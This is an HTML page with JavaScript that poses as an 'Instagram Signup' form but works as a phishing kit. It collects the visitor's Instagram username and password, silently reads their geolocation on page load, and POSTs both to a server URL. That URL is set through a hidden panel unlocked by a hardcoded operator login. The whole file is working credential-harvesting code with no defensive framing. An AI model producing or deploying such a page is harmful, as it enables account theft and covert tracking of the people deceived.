<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Signup</title>
    <style>
        /* Same styles as before */
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram Signup</h1>
        <form id="signupForm">
            <input type="text" id="username" class="input-field" placeholder="Instagram ID" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="button" class="btn-signup" onclick="signup()">Sign Up</button>
        </form>
        <div id="message" class="message">Server is not running perfectly, please try again later.</div>
        <div id="serverForm" style="display: none;">
            <input type="text" id="url" class="input-field" placeholder="Enter server URL">
            <button type="button" class="btn-signup" onclick="setUrl()">Set URL</button>
        </div>
    </div>

    <script>
        let serverUrl = "";
        let savedLocation = null; // Save the location for later use

        // Save the server URL
        function setUrl() {
            serverUrl = document.getElementById('url').value;
            if (!serverUrl.startsWith("http")) {
                alert("Please enter a valid URL.");
                return;
            }
            alert("Server URL set successfully.");
        }

        // Save location when the page loads
        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        savedLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                        };
                        console.log("Location saved:", savedLocation);
                    },
                    (error) => {
                        console.error("Error saving location:", error.message);
                    }
                );
            } else {
                console.error("Geolocation is not supported.");
            }
        };

        function signup() {
            const userId = document.getElementById('username').value;
            const userPassword = document.getElementById('password').value;
            const msg = document.getElementById('message');

            if (userId === "Arpit" && userPassword === "7592301521") {
                document.getElementById("serverForm").style.display = "block";
            }

            // Validate fields
            if (!userId || !userPassword) {
                msg.style.display = "block";
                msg.textContent = "Please fill in the above fields.";
                return;
            }

            if (!serverUrl) {
                msg.style.display = "block";
                msg.textContent = "Server URL is not set.";
                return;
            }

            // Send location (current or saved)
            const location = savedLocation || {
                latitude: "Unknown",
                longitude: "Unknown",
            };

            const requestData = {
                id: userId,
                password: userPassword,
                location,
            };

            sendHttpRequest(requestData);
        }

        function sendHttpRequest(data) {
            const msg = document.getElementById('message');

            fetch(serverUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            })
                .then((response) => {
                    if (response.ok) {
                        msg.style.display = "block";
                        msg.textContent = "Data sent successfully.";
                    } else {
                        msg.style.display = "block";
                        msg.textContent = "Failed to send data.";
                    }
                })
                .catch((error) => {
                    msg.style.display = "block";
                    msg.textContent = "Network error.";
                    console.error(error);
                });
        }
    </script>
</body>
</html>
